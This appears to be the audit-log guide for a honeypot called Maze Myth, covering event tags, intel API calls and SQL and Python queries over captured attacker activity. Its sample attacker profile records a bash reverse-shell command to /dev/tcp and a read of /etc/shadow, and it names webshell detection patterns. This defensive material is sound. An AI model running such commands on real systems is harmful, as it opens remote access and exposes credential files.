# Audit Logs Guide

Maze Myth writes every event to **two places in parallel**:

| Where                                  | Format                    | Good for                       |
| -------------------------------------- | ------------------------- | ------------------------------ |
| `log_files/api_audit.log`              | Base64-encoded text lines | Tamper-evident archiving       |
| `databases/honeypot.db` → `logs` table | Plain SQL rows            | Instant querying and filtering |
| `attacker_intel` (in-memory)           | Per-IP session objects    | Real-time behavioral analysis  |
> Note: In Docker Compose, attacker-facing traffic enters through the `proxy` service on port `80`. The `honeypot` service runs internally on `10.0.0.3:8001`; the dashboard is exposed on port `8002` and reads shared logs/SQLite state from named volumes.
---

## Log Levels

| Level | Meaning |
|-------|---------|
| `INFO` | Normal access (form views, safe uploads) |
| `WARNING` | Suspicious access (dangerous extensions, wrong extensions) |
| `CRITICAL` | High-value events (webshell upload, webshell execution, beacon fired) |
| `ERROR` | System errors / failed AI generations |

---

## Event Tags

### API Maze Events

| Tag | Trigger |
|-----|---------|
| `NEW_ENDPOINT_DISCOVERY` | Attacker hits a new path |
| `FILE_DOWNLOAD` | Attacker downloads a bait file |
| `BEACON_ACTIVATED` | Attacker opened a bait file (beacon fired) |
| `AUTH` | Login attempt |
| `MAZE` | Maze navigation event |

### CVE-2020-36179 Upload Trap Events

| Tag | Trigger | Severity |
|-----|---------|---------|
| `CVE_UPLOAD_FORM` | Attacker views Spring upload form | INFO |
| `CVE_PHP_UPLOAD_FORM` | Attacker views PHP upload form | INFO |
| `CVE_PHP_UPLOAD_SAFE` | Safe file uploaded (no webshell code) | MEDIUM/WARNING |
| `CVE_PHP_DANGEROUS_EXT` | Dangerous extension (.php/.jsp/.asp) but no payload | CRITICAL |
| `CVE_PHP_WEBSHELL_PAYLOAD` | File with real webshell code detected | CRITICAL |
| `CVE_PHP_WEBSHELL_REGISTERED` | Webshell registered in execution trap | CRITICAL |
| `CVE_SPRING_WEBSHELL_PAYLOAD` | Same via Spring endpoint | CRITICAL |
| `CVE_WEBSHELL_HIT` | Attacker executes command via `/uploads/<file>?cmd=` | CRITICAL |
| `CVE_UPLOAD_PROBE` | Attacker guesses unregistered filename | MEDIUM |

---

## Option A — CVE Intelligence API (Easiest)

Real-time attacker profiling — no SQL needed.

```bash
# Full intelligence dashboard
curl http://localhost:8002/api/intel/summary | python3 -m json.tool

# All attacker profiles
curl http://localhost:8002/api/intel/attackers | python3 -m json.tool

# Deep profile for one attacker IP
curl http://localhost:8002/api/intel/attacker/10.0.0.1 | python3 -m json.tool
```

**What the deep profile returns:**

```json
{
  "ip": "10.0.0.1",
  "geo": {
    "country": "Germany", "city": "Frankfurt",
    "isp": "Hetzner Online GmbH", "is_proxy": false, "is_hosting": true
  },
  "current_phase": "POST_EXPLOIT",
  "phase_label": "🐚  Post-Exploitation",
  "engagement_score": 87,
  "commands_run": 14,
  "webshells_uploaded": 2,
  "revshell_attempts": 3,
  "top_commands": [
    {"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "risk": 95, "label": "Bash TCP revshell"},
    {"cmd": "cat /etc/shadow", "risk": 55, "label": "Shadow file read"}
  ],
  "uploaded_files": [
    {"filename": "shell.php", "ext": ".php", "threat_level": "CRITICAL",
     "patterns": ["PHP_OPENER", "PHP_SYSTEM", "PHP_INPUT_GET"], "has_revshell": false}
  ],
  "deception": {
    "recommendation": "Surface fake cron jobs with root context in ps aux",
    "deception_hints": ["...", "..."],
    "tried_revshell": true
  }
}
```

---

## Option B — Query SQLite (Recommended for history)

```bash
sqlite3 databases/honeypot.db
```

### Useful SQL Queries

```sql
-- All CVE events, newest first
SELECT timestamp, level, event, client_ip, message
FROM logs
WHERE event LIKE 'CVE_%'
ORDER BY timestamp DESC
LIMIT 50;

-- All webshell executions
SELECT timestamp, client_ip, message FROM logs
WHERE event = 'CVE_WEBSHELL_HIT'
ORDER BY timestamp DESC;

-- All webshell uploads (real payloads)
SELECT timestamp, client_ip, message FROM logs
WHERE event IN ('CVE_PHP_WEBSHELL_PAYLOAD', 'CVE_SPRING_WEBSHELL_PAYLOAD');

-- All CRITICAL events
SELECT * FROM logs
WHERE level = 'CRITICAL'
ORDER BY timestamp DESC;

-- All activity from one IP
SELECT * FROM logs
WHERE client_ip = '10.0.0.1'
ORDER BY timestamp;

-- Count events per type
SELECT event, COUNT(*) AS total
FROM logs
WHERE event != ''
GROUP BY event
ORDER BY total DESC;

-- Top attacker IPs by hit count
SELECT client_ip, COUNT(*) AS hits
FROM logs
WHERE client_ip != ''
GROUP BY client_ip
ORDER BY hits DESC;

-- File downloads
SELECT timestamp, client_ip, message FROM logs
WHERE event = 'FILE_DOWNLOAD';

-- Beacon activations (attacker opened a file)
SELECT timestamp, client_ip, message FROM logs
WHERE event = 'BEACON_ACTIVATED';
```

### Query from Python

```python
import sqlite3

conn = sqlite3.connect("databases/honeypot.db")
conn.row_factory = sqlite3.Row

# All webshell hits
rows = conn.execute("""
    SELECT timestamp, level, event, client_ip, message
    FROM logs
    WHERE event = 'CVE_WEBSHELL_HIT'
    ORDER BY timestamp DESC
    LIMIT 20
""").fetchall()

for r in rows:
    print(f"[{r['timestamp']}] {r['client_ip']} | {r['message']}")

conn.close()
```

### Via state_manager (inside honeypot)

```python
from src.state import APIStateManager
state = APIStateManager()

state.get_logs(level='CRITICAL')
state.get_logs(event='CVE_WEBSHELL_HIT')
state.get_logs(client_ip='10.0.0.1')
state.get_logs(level='CRITICAL', limit=50)
```

---

## Option C — Read the Encoded Log File

`log_files/api_audit.log` — each line is a Base64-encoded log entry.

```python
import base64

with open("log_files/api_audit.log", "r") as f:
    for line in f:
        line = line.strip()
        if line:
            try:
                decoded = base64.b64decode(line).decode("utf-8")
                if "CVE_" in decoded:  # filter to CVE events
                    print(decoded)
            except Exception:
                pass
```

**PowerShell:**

```powershell
Get-Content log_files\api_audit.log | ForEach-Object {
    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))
} | Select-String "CVE_"
```
